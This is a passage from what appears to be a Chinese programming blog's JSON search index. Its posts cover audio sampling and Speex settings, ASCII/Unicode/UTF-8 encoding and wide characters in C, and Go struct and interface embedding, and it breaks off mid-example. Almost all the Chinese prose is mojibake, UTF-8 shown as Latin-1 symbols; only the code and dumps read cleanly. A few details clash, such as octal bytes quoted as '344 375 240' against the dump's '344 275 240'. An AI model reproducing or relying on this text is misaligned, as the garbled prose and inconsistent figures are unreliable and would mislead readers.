·ç²¾åº¦ï¼šæŒ‡è®°å½•å£°éŸ³çš„åŠ¨æ€èŒƒå›´ï¼Œå®ƒä»¥ä½(Bit)ä¸ºå•ä½ã€‚\nå£°éŸ³é€šé“ï¼šæ—¢å£°é“æ•°ï¼ˆ1-8ä¸ªï¼‰ã€‚\n\né‡‡æ ·ç‡æ ¹æ®ä½¿ç”¨ç±»å‹ä¸åŒå¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼ˆkæ—¢åƒä½ç¬¦å·ï¼Œ1khz=1000hzï¼‰ï¼š\n8khzï¼šç”µè¯ç­‰ä½¿ç”¨ï¼Œå¯¹äºè®°å½•äººå£°å·²ç»è¶³å¤Ÿä½¿ç”¨ã€‚\n22.05khzï¼šå¹¿æ’­ä½¿ç”¨é¢‘ç‡ã€‚\n44.1kbï¼šéŸ³é¢‘CDã€‚\n48khzï¼šDVDã€æ•°å­—ç”µè§†ä¸­ä½¿ç”¨ã€‚\n96khz-192khzï¼šDVD-Audioã€è“å…‰é«˜æ¸…ç­‰ä½¿ç”¨ã€‚\n\né‡‡æ ·ç²¾åº¦å¸¸ç”¨èŒƒå›´ä¸º8bit-32bitï¼Œè€ŒCDä¸­ä¸€èˆ¬éƒ½ä½¿ç”¨16bitã€‚\n<!-- more -->\n\n\néŸ³é¢‘çš„æ¯”ç‰¹ç‡ï¼Œå®é™…ä¸Šå°±æ˜¯å‹ç¼©æ¯”ä¾‹ã€‚\nä½†æ¯”ç‰¹ç‡æœ¬èº«å¹¶ä¸å¯¹æ–‡ä»¶çš„è´¨é‡æœ‰ç›´æ¥å½±å“ï¼Œä¾‹å¦‚æˆ‘ä»¬æŠŠ128kbçš„æ–‡ä»¶ä½œä¸ºæºæ–‡ä»¶ï¼Œå³ä½¿è½¬æ¢æˆ320kbçš„æ–‡ä»¶ï¼Œå…¶éŸ³è´¨ä¾ç„¶ä¸ä¼šæ¯”128kbå¥½ã€‚\né‚£ä¹ˆæ¯”ç‰¹ç‡ä¸­çš„æ•°å­—å’Œå­—æ¯åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿé¦–å…ˆçœ‹128kçš„å…¨ç§°â€œ128kbpsâ€ï¼Œæˆ‘ä»¬è¯•ç€åˆ†è§£ä¸€ä¸‹ï¼š128æ˜¯æ•°å­—ï¼Œkæ˜¯åƒä½ç¬¦ï¼Œbæ˜¯å•ä½ï¼Œsæ˜¯ç§’ï¼Œpså…¶å®å°±æ˜¯â€œ/sâ€ã€‚è¿™æ ·æ¥çœ‹ï¼Œ128kbpså°±æ˜¯128kb/sã€‚ä¹Ÿå°±æ˜¯æ¯ç§’128kbã€‚\n\n\n\n### speexæ ¼å¼å½•éŸ³å‚æ•°:\n\n```\nquality = 9  \t                       \t\t//speexè´¨é‡,å€¼è¶Šå¤§è´¨é‡è¶Šå¥½,æ–‡ä»¶è¶Šå¤§  open()çš„å‚æ•°\nspeex_version = \"speex-1.2rc\"      //speexç‰ˆæœ¬\nospeex_version_id = 1 \t\t\t//speexç‰ˆæœ¬id\nheader_size = 80 \t \t\t\t//speexå¤´ä¿¡æ¯å¤§å°\nrate = 16000\t\t\t\t\t//é‡‡æ ·ç‡å¤§å°\nmode = 1\t\t\t \t\t\t//mode  0æ˜¯çª„å¸¦æ¨¡å¼, 1æ˜¯å®½å¸¦æ¨¡å¼ (0=NB, 1=WB, 2=UWB)\nbitrate = -1 \t\t \t\t\t//æ¯”ç‰¹ç‡\nframe_size = 320   \t \t\t\t//ç¼“å†²åŒºå¤§å°  çª„å¸¦å¯¹åº”160, å®½å¸¦å¯¹åº”320  (NB=160, WB=320, UWB=640)\nvbr = 1\t\t\t\t\t\t//æ˜¯å¦ä½¿ç”¨å¯å˜æ¯”ç‰¹ç‡\nnframes  = 1 \t\t\t\t\t// æ¯å¸§çš„speexåŒ…çš„æ•°é‡\nchannels =1    \t\t\t        //éŸ³é¢‘è¾“å…¥çš„å£°é“ \t1æ˜¯å•å£°é“ï¼Œ2æ˜¯ç«‹ä½“å£°\n```","tags":["éŸ³é¢‘"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"å­—ç¬¦ç¼–ç ","url":"%2Fp%2Febfb97d0.html","content":"\n### ASCIIç \nASCIIç çš„å–å€¼èŒƒå›´æ˜¯0~127ï¼Œå¯ä»¥ç”¨7ä¸ªbitè¡¨ç¤ºã€‚Cè¯­è¨€ä¸­charå‹å˜é‡çš„å¤§å°è§„å®šä¸ºä¸€å­—èŠ‚ï¼Œå¦‚æœå­˜æ”¾ASCIIç åˆ™åªç”¨åˆ°ä½7ä½ï¼Œé«˜ä½ä¸º0ã€‚ä»¥ä¸‹æ˜¯ASCIIç è¡¨ï¼š\n\n\nç»å¤§å¤šæ•°è®¡ç®—æœºçš„ä¸€ä¸ªå­—èŠ‚æ˜¯8ä½ï¼Œå–å€¼èŒƒå›´æ˜¯0~255ï¼Œè€ŒASCIIç å¹¶æ²¡æœ‰è§„å®šç¼–å·ä¸º128~255çš„å­—ç¬¦ï¼Œä¸ºäº†èƒ½è¡¨ç¤ºæ›´å¤šå­—ç¬¦ï¼Œå„å‚å•†åˆ¶å®šäº†å¾ˆå¤šç§ASCIIç çš„æ‰©å±•è§„èŒƒã€‚æ³¨æ„ï¼Œè™½ç„¶é€šå¸¸æŠŠè¿™äº›è§„èŒƒç§°ä¸ºæ‰©å±•ASCIIç ï¼ˆExtended ASCIIï¼‰ï¼Œä½†å…¶å®å®ƒä»¬å¹¶ä¸å±äºASCIIç æ ‡å‡†ã€‚\n\n<!-- more -->\n\n### Unicodeå’ŒUTF-8\n\nä¸ºäº†ç»Ÿä¸€å…¨ä¸–ç•Œå„å›½è¯­è¨€æ–‡å­—å’Œä¸“ä¸šé¢†åŸŸç¬¦å·ï¼ˆä¾‹å¦‚æ•°å­¦ç¬¦å·ã€ä¹è°±ç¬¦å·ï¼‰çš„ç¼–ç ï¼ŒISOåˆ¶å®šäº†ISO 10646æ ‡å‡†ï¼Œä¹Ÿç§°ä¸ºUCSï¼ˆUniversal Character Setï¼‰ã€‚UCSç¼–ç çš„é•¿åº¦æ˜¯31ä½ï¼Œå¯ä»¥è¡¨ç¤º231ä¸ªå­—ç¬¦ã€‚å¦‚æœä¸¤ä¸ªå­—ç¬¦ç¼–ç çš„é«˜ä½ç›¸åŒï¼Œåªæœ‰ä½16ä½ä¸åŒï¼Œåˆ™å®ƒä»¬å±äºä¸€ä¸ªå¹³é¢ï¼ˆPlaneï¼‰ï¼Œæ‰€ä»¥ä¸€ä¸ªå¹³é¢ç”±216ä¸ªå­—ç¬¦ç»„æˆã€‚ç›®å‰å¸¸ç”¨çš„å¤§éƒ¨åˆ†å­—ç¬¦éƒ½ä½äºç¬¬ä¸€ä¸ªå¹³é¢ï¼ˆç¼–ç èŒƒå›´æ˜¯U-00000000~U-0000FFFDï¼‰ï¼Œç§°ä¸ºBMPï¼ˆBasic Multilingual Planeï¼‰æˆ–Plane 0ï¼Œä¸ºäº†å‘åå…¼å®¹ï¼Œå…¶ä¸­ç¼–å·ä¸º0~256çš„å­—ç¬¦å’ŒLatin-1ç›¸åŒã€‚UCSç¼–ç é€šå¸¸ç”¨U-xxxxxxxxè¿™ç§å½¢å¼è¡¨ç¤ºï¼Œè€ŒBMPçš„ç¼–ç é€šå¸¸ç”¨U+xxxxè¿™ç§å½¢å¼è¡¨ç¤ºï¼Œå…¶ä¸­xæ˜¯åå…­è¿›åˆ¶æ•°å­—ã€‚åœ¨ISOåˆ¶å®šUCSçš„åŒæ—¶ï¼Œå¦ä¸€ä¸ªç”±å‚å•†è”åˆç»„ç»‡ä¹Ÿåœ¨ç€æ‰‹åˆ¶å®šè¿™æ ·çš„ç¼–ç ï¼Œç§°ä¸ºUnicodeï¼Œåæ¥ä¸¤å®¶è”æ‰‹åˆ¶å®šç»Ÿä¸€çš„ç¼–ç ï¼Œä½†å„è‡ªå‘å¸ƒå„è‡ªçš„æ ‡å‡†æ–‡æ¡£ï¼Œæ‰€ä»¥UCSç¼–ç å’ŒUnicodeç æ˜¯ç›¸åŒçš„ã€‚\n\n\næœ‰äº†å­—ç¬¦ç¼–ç ï¼Œå¦ä¸€ä¸ªé—®é¢˜å°±æ˜¯è¿™æ ·çš„ç¼–ç åœ¨è®¡ç®—æœºä¸­æ€ä¹ˆè¡¨ç¤ºã€‚ç°åœ¨å·²ç»ä¸å¯èƒ½ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦äº†ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•å°±æ˜¯ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ç§è¡¨ç¤ºæ–¹æ³•ç§°ä¸ºUCS-4æˆ–UTF-32ï¼ŒUTFæ˜¯Unicode Transformation Formatçš„ç¼©å†™ã€‚ä¸€æ–¹é¢è¿™æ ·æ¯”è¾ƒæµªè´¹å­˜å‚¨ç©ºé—´ï¼Œç”±äºå¸¸ç”¨å­—ç¬¦éƒ½é›†ä¸­åœ¨BMPï¼Œé«˜ä½çš„ä¸¤ä¸ªå­—èŠ‚é€šå¸¸æ˜¯0ï¼Œå¦‚æœåªç”¨ASCIIç æˆ–Latin-1ï¼Œé«˜ä½çš„ä¸‰ä¸ªå­—èŠ‚éƒ½æ˜¯0ã€‚å¦ä¸€ç§æ¯”è¾ƒèŠ‚çœå­˜å‚¨ç©ºé—´çš„åŠæ³•æ˜¯ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œç§°ä¸ºUCS-2æˆ–UTF-16ï¼Œè¿™æ ·åªèƒ½è¡¨ç¤ºBMPä¸­çš„å­—ç¬¦ï¼Œä½†BMPä¸­æœ‰ä¸€äº›æ‰©å±•å­—ç¬¦ï¼Œå¯ä»¥ç”¨ä¸¤ä¸ªè¿™æ ·çš„æ‰©å±•å­—ç¬¦è¡¨ç¤ºå…¶å®ƒå¹³é¢çš„å­—ç¬¦ï¼Œç§°ä¸ºSurrogate Pairã€‚æ— è®ºæ˜¯UTF-32è¿˜æ˜¯UTF-16éƒ½æœ‰ä¸€ä¸ªæ›´ä¸¥é‡çš„é—®é¢˜æ˜¯å’ŒCè¯­è¨€ä¸å…¼å®¹ï¼Œåœ¨Cè¯­è¨€ä¸­0å­—èŠ‚è¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾ï¼Œåº“å‡½æ•°strlenã€strcpyç­‰ç­‰éƒ½ä¾èµ–äºè¿™ä¸€ç‚¹ï¼Œå¦‚æœå­—ç¬¦ä¸²ç”¨UTF-32å­˜å‚¨ï¼Œå…¶ä¸­æœ‰å¾ˆå¤š0å­—èŠ‚å¹¶ä¸è¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾ï¼Œè¿™å°±ä¹±å¥—äº†ã€‚\n\n\n\nUNIXä¹‹çˆ¶Ken Thompsonæå‡ºçš„UTF-8ç¼–ç å¾ˆå¥½åœ°è§£å†³äº†è¿™äº›é—®é¢˜ï¼Œç°åœ¨å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚\n\nUTF-8å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š\n\n\n  â— ç¼–ç ä¸ºU+0000~U+007Fçš„å­—ç¬¦åªå ä¸€ä¸ªå­—èŠ‚ï¼Œå°±æ˜¯0x00~0x7Fï¼Œå’ŒASCIIç å…¼å®¹ã€‚\n\n  â— ç¼–ç å¤§äºU+007Fçš„å­—ç¬¦ç”¨2~6ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œæ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä½éƒ½æ˜¯1ï¼Œè€ŒASCIIç çš„æœ€é«˜ä½éƒ½æ˜¯0ï¼Œå› æ­¤éASCIIç å­—ç¬¦çš„è¡¨ç¤ºä¸­ä¸ä¼šå‡ºç°ASCIIç å­—èŠ‚ï¼ˆä¹Ÿå°±ä¸ä¼šå‡ºç°0å­—èŠ‚ï¼‰ã€‚\n\n  â— ç”¨äºè¡¨ç¤ºéASCIIç å­—ç¬¦çš„å¤šå­—èŠ‚åºåˆ—ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å–å€¼èŒƒå›´æ˜¯0xC0~0xFDï¼Œæ ¹æ®å®ƒå¯ä»¥åˆ¤æ–­åé¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦çš„ç¼–ç ã€‚åé¢æ¯ä¸ªå­—èŠ‚çš„å–å€¼èŒƒå›´éƒ½æ˜¯0x80~0xBFï¼Œè§ä¸‹é¢çš„è¯¦ç»†è¯´æ˜ã€‚\n\n  â— UCSå®šä¹‰çš„æ‰€æœ‰231ä¸ªå­—ç¬¦éƒ½å¯ä»¥ç”¨UTF-8ç¼–ç è¡¨ç¤ºå‡ºæ¥ã€‚\n\n  â— UTF-8ç¼–ç æœ€é•¿6ä¸ªå­—èŠ‚ï¼ŒBMPå­—ç¬¦çš„UTF-8ç¼–ç æœ€é•¿ä¸‰ä¸ªå­—èŠ‚ã€‚\n\n  â— 0xFEå’Œ0xFFè¿™ä¸¤ä¸ªå­—èŠ‚åœ¨UTF-8ç¼–ç ä¸­ä¸ä¼šå‡ºç°ã€‚\n\nå…·ä½“æ¥è¯´ï¼ŒUTF-8ç¼–ç æœ‰ä»¥ä¸‹å‡ ç§æ ¼å¼ï¼š\n\n```\nU-00000000 â€“ U-0000007F:  0xxxxxxx\nU-00000080 â€“ U-000007FF:  110xxxxx 10xxxxxx\nU-00000800 â€“ U-0000FFFF:  1110xxxx 10xxxxxx 10xxxxxx\nU-00010000 â€“ U-001FFFFF:  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-00200000 â€“ U-03FFFFFF:  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-04000000 â€“ U-7FFFFFFF:  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n```\nç¬¬ä¸€ä¸ªå­—èŠ‚è¦ä¹ˆæœ€é«˜ä½æ˜¯0ï¼ˆASCIIå­—èŠ‚ï¼‰ï¼Œè¦ä¹ˆæœ€é«˜ä¸¤ä½éƒ½æ˜¯1ï¼Œ\n\næœ€é«˜ä½ä¹‹å1çš„ä¸ªæ•°å†³å®šåé¢æœ‰å¤šå°‘ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦ç¼–ç ï¼Œä¾‹å¦‚111110xxï¼Œæœ€é«˜ä½ä¹‹åè¿˜æœ‰å››ä¸ª1ï¼Œè¡¨ç¤ºåé¢æœ‰å››ä¸ªå­—èŠ‚ä¹Ÿå±äºå½“å‰å­—ç¬¦çš„ç¼–ç ã€‚åé¢æ¯ä¸ªå­—èŠ‚çš„æœ€é«˜ä¸¤ä½éƒ½æ˜¯10ï¼Œå¯ä»¥å’Œç¬¬ä¸€ä¸ªå­—èŠ‚åŒºåˆ†å¼€ã€‚è¿™æ ·çš„è®¾è®¡æœ‰åˆ©äºè¯¯ç åŒæ­¥ï¼Œä¾‹å¦‚åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­ä¸¢å¤±äº†å‡ ä¸ªå­—èŠ‚ï¼Œå¾ˆå®¹æ˜“åˆ¤æ–­å½“å‰å­—ç¬¦æ˜¯ä¸å®Œæ•´çš„ï¼Œä¹Ÿå¾ˆå®¹æ˜“æ‰¾åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦ä»å“ªé‡Œå¼€å§‹ï¼Œç»“æœé¡¶å¤šä¸¢æ‰ä¸€ä¸¤ä¸ªå­—ç¬¦ï¼Œè€Œä¸ä¼šå¯¼è‡´åé¢çš„ç¼–ç è§£é‡Šå…¨éƒ¨æ··ä¹±äº†ã€‚ä¸Šé¢çš„æ ¼å¼ä¸­æ ‡ä¸ºxçš„ä½å°±æ˜¯UCSç¼–ç ï¼Œæœ€åä¸€ç§6å­—èŠ‚çš„æ ¼å¼ä¸­xä½æœ‰31ä¸ªï¼Œå¯ä»¥è¡¨ç¤º31ä½çš„UCSç¼–ç ï¼ŒUTF-8å°±åƒä¸€åˆ—ç«è½¦ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯è½¦å¤´ï¼Œåé¢æ¯ä¸ªå­—èŠ‚æ˜¯è½¦å¢ï¼Œå…¶ä¸­æ‰¿è½½çš„è´§ç‰©æ˜¯UCSç¼–ç ã€‚UTF-8è§„å®šæ‰¿è½½çš„UCSç¼–ç ä»¥å¤§ç«¯è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸­çš„xæ˜¯UCSç¼–ç çš„é«˜ä½ï¼Œåé¢å­—èŠ‚ä¸­çš„xæ˜¯UCSç¼–ç çš„ä½ä½ã€‚\nä¾‹å¦‚U+00A9ï¼ˆÂ©å­—ç¬¦ï¼‰çš„äºŒè¿›åˆ¶æ˜¯10101001ï¼Œç¼–ç æˆUTF-8æ˜¯11000010 10101001ï¼ˆ0xC2 0xA9ï¼‰ï¼Œä½†ä¸èƒ½ç¼–ç æˆ11100000 10000010 10101001ï¼ŒUTF-8è§„å®šæ¯ä¸ªå­—ç¬¦åªèƒ½ç”¨å°½å¯èƒ½å°‘çš„å­—èŠ‚æ¥ç¼–ç ã€‚\n\n\n```\n10101001\n11000010 10101001     \t           // å¤§ç«¯ä¹Ÿç¬¦åˆé˜…è¯»è§„èŒƒ\n\n\n10101001\n11100000 10000010 10101001   //è¿™æ ·ä¸å¯ä»¥, ç”¨å°½å¯èƒ½å°‘çš„å­—èŠ‚æ¥ç¼–ç \n```\n\n\n\n### åœ¨Linux Cç¼–ç¨‹ä¸­ä½¿ç”¨Unicodeå’ŒUTF-8\n\nç›®å‰å„ç§Linuxå‘è¡Œç‰ˆéƒ½æ”¯æŒUTF-8ç¼–ç ï¼Œå½“å‰ç³»ç»Ÿçš„è¯­è¨€å’Œå­—ç¬¦ç¼–ç è®¾ç½®ä¿å­˜åœ¨ä¸€äº›ç¯å¢ƒå˜é‡ä¸­ï¼Œå¯ä»¥é€šè¿‡localeå‘½ä»¤æŸ¥çœ‹ï¼š\n\n```\n$ locale\nLANG=en_US.UTF-8\nLC_CTYPE=\"en_US.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"en_US.UTF-8\"\nLC_COLLATE=\"en_US.UTF-8\"\nLC_MONETARY=\"en_US.UTF-8\"\nLC_MESSAGES=\"en_US.UTF-8\"\nLC_PAPER=\"en_US.UTF-8\"\nLC_NAME=\"en_US.UTF-8\"\nLC_ADDRESS=\"en_US.UTF-8\"\nLC_TELEPHONE=\"en_US.UTF-8\"\nLC_MEASUREMENT=\"en_US.UTF-8\"\nLC_IDENTIFICATION=\"en_US.UTF-8\"\nLC_ALL=\n```\nå¸¸ç”¨æ±‰å­—ä¹Ÿéƒ½ä½äºBMPä¸­ï¼Œæ‰€ä»¥ä¸€ä¸ªæ±‰å­—çš„å­˜å‚¨é€šå¸¸å 3ä¸ªå­—èŠ‚ã€‚\n\n\n\n\nä¾‹å¦‚ç¼–è¾‘ä¸€ä¸ªCç¨‹åºï¼š\n\n```\n#include <stdio.h>\n\nint main(void)\n{\n\tprintf(\"ä½ å¥½\\n\");\n\treturn 0;\n}\n```\næºæ–‡ä»¶æ˜¯ä»¥UTF-8ç¼–ç å­˜å‚¨çš„ï¼š\n\n```\n$ od -tc nihao.c \n0000000   #   i   n   c   l   u   d   e       <   s   t   d   i   o   .\n0000020   h   >  \\n  \\n   i   n   t       m   a   i   n   (   v   o   i\n0000040   d   )  \\n   {  \\n  \\t   p   r   i   n   t   f   (   \" 344 275\n0000060 240 345 245 275   \\   n   \"   )   ;  \\n  \\t   r   e   t   u   r\n0000100   n       0   ;  \\n   }  \\n\n0000107\n```\nå…¶ä¸­å…«è¿›åˆ¶çš„344 375 240ï¼ˆåå…­è¿›åˆ¶e4 bd a0ï¼‰å°±æ˜¯â€œä½ â€çš„UTF-8ç¼–ç ï¼Œå…«è¿›åˆ¶çš„345 245 275ï¼ˆåå…­è¿›åˆ¶e5 a5 bdï¼‰å°±æ˜¯â€œå¥½â€ã€‚æŠŠå®ƒç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œ\"ä½ å¥½\\n\"è¿™ä¸ªå­—ç¬¦ä¸²å°±æˆäº†è¿™æ ·ä¸€ä¸²å­—èŠ‚ï¼še4 bd a0 e5 a5 bd 0a 00ï¼Œæ±‰å­—åœ¨å…¶ä¸­ä»ç„¶æ˜¯UTF-8ç¼–ç çš„ï¼Œä¸€ä¸ªæ±‰å­—å 3ä¸ªå­—èŠ‚ï¼Œè¿™ç§å­—ç¬¦åœ¨Cè¯­è¨€ä¸­ç§°ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼ˆMultibyte Characterï¼‰ã€‚è¿è¡Œè¿™ä¸ªç¨‹åºç›¸å½“äºæŠŠè¿™ä¸€ä¸²å­—èŠ‚writeåˆ°å½“å‰ç»ˆç«¯çš„è®¾å¤‡æ–‡ä»¶ã€‚å¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºèƒ½å¤Ÿè¯†åˆ«UTF-8ç¼–ç å°±èƒ½æ‰“å°å‡ºæ±‰å­—ï¼Œå¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºä¸èƒ½è¯†åˆ«UTF-8ç¼–ç ï¼ˆæ¯”å¦‚ä¸€èˆ¬çš„å­—ç¬¦ç»ˆç«¯ï¼‰å°±æ‰“å°ä¸å‡ºæ±‰å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåƒè¿™ç§ç¨‹åºï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ—¢ä¸æ˜¯ç”±Cç¼–è¯‘å™¨åšçš„ä¹Ÿä¸æ˜¯ç”±libcåšçš„ï¼ŒCç¼–è¯‘å™¨åŸå°ä¸åŠ¨åœ°æŠŠæºæ–‡ä»¶ä¸­çš„UTF-8ç¼–ç å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œlibcåªæ˜¯å½“ä½œä»¥0ç»“å°¾çš„å­—ç¬¦ä¸²åŸå°ä¸åŠ¨åœ°writeç»™å†…æ ¸ï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ˜¯ç”±ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºåšçš„ã€‚\n\n\n\nä½†æ˜¯ä»…æœ‰è¿™ç§ç¨‹åº¦çš„æ±‰å­—æ”¯æŒæ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨Cç¨‹åºä¸­æ“ä½œå­—ç¬¦ä¸²é‡Œçš„å­—ç¬¦ï¼Œæ¯”å¦‚æ±‚å­—ç¬¦ä¸²\"ä½ å¥½\\n\"ä¸­æœ‰å‡ ä¸ªæ±‰å­—æˆ–å­—ç¬¦ï¼Œç”¨strlenå°±ä¸çµäº†ï¼Œå› ä¸ºstrlenåªçœ‹ç»“å°¾çš„0å­—èŠ‚è€Œä¸ç®¡å­—ç¬¦ä¸²é‡Œå­˜çš„æ˜¯ä»€ä¹ˆï¼Œæ±‚å‡ºæ¥çš„æ˜¯å­—èŠ‚æ•°7ã€‚ä¸ºäº†åœ¨ç¨‹åºä¸­æ“ä½œUnicodeå­—ç¬¦ï¼ŒCè¯­è¨€å®šä¹‰äº†å®½å­—ç¬¦ï¼ˆWide Characterï¼‰ç±»å‹wchar_tå’Œä¸€äº›åº“å‡½æ•°ã€‚\n\n\nåœ¨å­—ç¬¦å¸¸é‡æˆ–å­—ç¬¦ä¸²å­—é¢å€¼å‰é¢åŠ ä¸€ä¸ªLå°±è¡¨ç¤ºå®½å­—ç¬¦å¸¸é‡æˆ–å®½å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚å®šä¹‰wchar_t c = L'ä½ ';ï¼Œå˜é‡cçš„å€¼å°±æ˜¯æ±‰å­—â€œä½ â€çš„31ä½UCSç¼–ç ï¼Œè€ŒL\"ä½ å¥½\\n\"å°±ç›¸å½“äº{L'ä½ ', L'å¥½', L'\\n', 0}ï¼Œwcslenå‡½æ•°å°±å¯ä»¥å–å®½å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¸ªæ•°ã€‚\n\n\n```\n#include <stdio.h>\n#include <locale.h>\n\nint main(void)\n{\n\tif (!setlocale(LC_CTYPE, \"\")) {\n\t\tfprintf(stderr, \"Can't set the specified locale! \"\n\t\t\t\"Check LANG, LC_CTYPE, LC_ALL.\\n\");\n\t\treturn 1;\n\t}\n\tprintf(\"%ls\", L\"ä½ å¥½\\n\");\n\treturn 0;\n}\n```\n\nå®½å­—ç¬¦ä¸²L\"ä½ å¥½\\n\"åœ¨æºä»£ç ä¸­å½“ç„¶è¿˜æ˜¯å­˜æˆUTF-8ç¼–ç çš„ï¼Œä½†ç¼–è¯‘å™¨ä¼šæŠŠå®ƒå˜æˆ4ä¸ªUCSç¼–ç 0x00004f60 0x0000597d 0x0000000a 0x00000000ä¿å­˜åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼ŒæŒ‰å°ç«¯å­˜å‚¨å°±æ˜¯60 4f 00 00 7d 59 00 00 0a 00 00 00 00 00 00 00ï¼Œç”¨odå‘½ä»¤æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶åº”è¯¥èƒ½æ‰¾åˆ°è¿™äº›å­—èŠ‚ã€‚\n\n\nprintfçš„%lsè½¬æ¢è¯´æ˜è¡¨ç¤ºæŠŠåé¢çš„å‚æ•°æŒ‰å®½å­—ç¬¦ä¸²è§£é‡Šï¼Œä¸æ˜¯è§åˆ°0å­—èŠ‚å°±ç»“æŸï¼Œè€Œæ˜¯è§åˆ°UCSç¼–ç ä¸º0çš„å­—ç¬¦æ‰ç»“æŸï¼Œä½†æ˜¯è¦writeåˆ°ç»ˆç«¯ä»ç„¶éœ€è¦ä»¥å¤šå­—èŠ‚ç¼–ç è¾“å‡ºï¼Œè¿™æ ·ç»ˆç«¯é©±åŠ¨ç¨‹åºæ‰èƒ½è¯†åˆ«ï¼Œæ‰€ä»¥printfåœ¨å†…éƒ¨æŠŠå®½å­—ç¬¦ä¸²è½¬æ¢æˆå¤šå­—èŠ‚å­—ç¬¦ä¸²å†writeå‡ºå»ã€‚äº‹å®ä¸Šï¼ŒCæ ‡å‡†å¹¶æ²¡æœ‰è§„å®šå¤šå­—èŠ‚å­—ç¬¦å¿…é¡»ä»¥UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒçš„å¤šå­—èŠ‚ç¼–ç ï¼Œåœ¨è¿è¡Œæ—¶æ ¹æ®ç¯å¢ƒå˜é‡ç¡®å®šå½“å‰ç³»ç»Ÿçš„ç¼–ç ï¼Œæ‰€ä»¥åœ¨ç¨‹åºå¼€å¤´éœ€è¦è°ƒç”¨setlocaleè·å–å½“å‰ç³»ç»Ÿçš„ç¼–ç è®¾ç½®ï¼Œå¦‚æœå½“å‰ç³»ç»Ÿæ˜¯UTF-8çš„ï¼Œprintfå°±æŠŠUCSç¼–ç è½¬æ¢æˆUTF-8ç¼–ç çš„å¤šå­—èŠ‚å­—ç¬¦ä¸²å†writeå‡ºå»ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç¨‹åºåœ¨åšå†…éƒ¨è®¡ç®—æ—¶é€šå¸¸ä»¥å®½å­—ç¬¦ç¼–ç ï¼Œå¦‚æœè¦å­˜ç›˜æˆ–è€…è¾“å‡ºç»™åˆ«çš„ç¨‹åºï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œå‘ç»™åˆ«çš„ç¨‹åºï¼Œåˆ™é‡‡ç”¨å¤šå­—èŠ‚ç¼–ç ã€‚","tags":["å­—ç¬¦"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"golangçš„ç»§æ‰¿å’Œå¤šæ€","url":"%2Fp%2Fa5099912.html","content":"\n\n# 1. interface struct èƒ½å¦ç›¸äº’åµŒå¥—\n\n1. struct struct //ç»§æ‰¿(ä¸èƒ½å¤šæ€), å¦‚æœå†…éƒ¨structå®ç°äº†æ¥å£, å®ƒä¹Ÿç›¸å½“äºå®ç°äº†æ¥å£\n2. struct interface //å¯ä»¥å†…éƒ¨ç”¨interfaceå¤šæ€\n3. interface interface  //å•çº¯çš„å¯¼å…¥\n4. interface struct  //ä¸å…è®¸\n\n<!-- more -->\n\n# 2. structæ–¹æ³•å‚æ•°å®šä¹‰æŒ‡é’ˆè¿˜æ˜¯å€¼ \n\næ— è®ºæ–¹æ³•å‚æ•°å®šä¹‰æˆæŒ‡é’ˆè¿˜æ˜¯å€¼, éƒ½å¯ä»¥è°ƒç”¨\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype S struct {\n\tage int\n}\n\nfunc (s S) Value() {\n\tfmt.Println(s.age)\n}\n\nfunc (s *S) Point(age int) {\n\ts.age = age\n}\n\nfunc main() {\n\n\t// è‡ªå·±æ˜¯æŒ‡é’ˆ, èƒ½å¤Ÿè°ƒç”¨ä¸€åˆ‡\n\ts := new(S)\n\ts.Point(1)\n\ts.Value()      //1\n\tfmt.Println(s) //&{1}\n\n\t// è‡ªå·±ä¸æ˜¯æŒ‡é’ˆ,ä¹Ÿèƒ½è°ƒç”¨æŒ‡é’ˆå‡½æ•°ä¿®æ”¹å€¼\n\tv := S{}\n\tv.Point(2)\n\tv.Value()      